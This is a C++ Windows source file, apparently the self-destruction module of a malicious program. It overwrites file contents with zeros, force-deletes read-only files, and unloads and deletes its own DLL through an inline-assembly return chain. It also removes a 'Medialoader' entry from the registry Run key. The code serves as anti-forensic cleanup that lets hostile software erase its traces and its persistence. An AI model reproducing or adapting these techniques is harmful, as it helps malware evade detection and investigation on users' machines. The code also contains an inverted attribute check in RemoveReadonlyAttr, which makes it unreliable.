#include "stdafx.h"
#include "SelfDestruction.h"

namespace SelfDestruction
{

	BOOL CleanFile( LPCTSTR filepath )
	{
		HANDLE hFile = ::CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			errorLogE(_T("open file [%s] failed."), filepath);
			return FALSE;
		}

		HANDLE hMapping = NULL;
		LPVOID lpBase = NULL;
		BOOL bSuccess = FALSE;
		do 
		{
			DWORD dwFileSize = GetFileSize(hFile, NULL);

			hMapping = ::CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
			if (NULL == hMapping)
			{
				errorLogE(_T("create filemapping failed.[%s]."), filepath);
				break;
			}

			lpBase = ::MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
			if (NULL == lpBase)
			{
				errorLogE(_T("mapviewoffile failed."));
				break;
			}

			ZeroMemory(lpBase, dwFileSize);

			bSuccess = TRUE;
		} while (FALSE);

		if (NULL != lpBase) ::UnmapViewOfFile(lpBase);
		if (NULL != hMapping) ::CloseHandle(hMapping);
		if (INVALID_HANDLE_VALUE != hFile) ::CloseHandle(hFile);

		return bSuccess;
	}

	BOOL RemoveReadonlyAttr( LPCTSTR filepath )
	{
		if (NULL == filepath) return FALSE;

		DWORD dwAttr = ::GetFileAttributes(filepath);
		if (INVALID_FILE_ATTRIBUTES != dwAttr)
		{
			return FALSE;
		}

		if (FILE_ATTRIBUTE_READONLY & dwAttr)
		{
			dwAttr &= (~FILE_ATTRIBUTE_READONLY);
			if (! ::SetFileAttributes(filepath, dwAttr))
			{
				return FALSE;
			}
		}
	
		return TRUE;
	}

	BOOL DeleteFileIgnoreReadonly( LPCTSTR filepath )
	{
		if (NULL == filepath) return FALSE;

		if (! ::DeleteFile(filepath))
		{
			DWORD dwError = ::GetLastError();
			if (ERROR_ACCESS_DENIED == dwError)
			{
				if (RemoveReadonlyAttr(filepath))
				{
					return ::DeleteFile(filepath);
				}
			}
			else if (ERROR_FILE_NOT_FOUND == dwError)
			{
				return TRUE;
			}

			return FALSE;
		}
		else
		{
			return TRUE;
		}
	}

	BOOL ExitAndDeleteSelfDll(HMODULE hDll)
	{
 		TCHAR* szDll = (TCHAR*) ::VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
 		if (0 == GetModuleFileName(hDll, szDll, MAX_PATH))
 		{
 			errorLogE(_T("getmodulefilename failed."));
 			return FALSE;
 		}
		infoLog(_T("try to remove[%s]"), szDll);
 		RemoveReadonlyAttr(szDll);
 
 		__asm
 		{
 			push 0	;参数1
 			push 0
 			push szDll	;参数2
 			push ExitProcess
 			push hDll	;参数3
 			push DeleteFile
 			push FreeLibrary
 			ret		
 		}

		return TRUE;
	}

	void SelfDestruction::DeleteRunItem()
	{
		HKEY hKey;

		LONG lnRes = RegOpenKeyEx(
			HKEY_CURRENT_USER,
			_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
			0,KEY_WRITE,
			&hKey
			);

		lnRes = RegDeleteValue(
			hKey,
			_T("Medialoader")
			);

		RegCloseKey(hKey);
	}
}

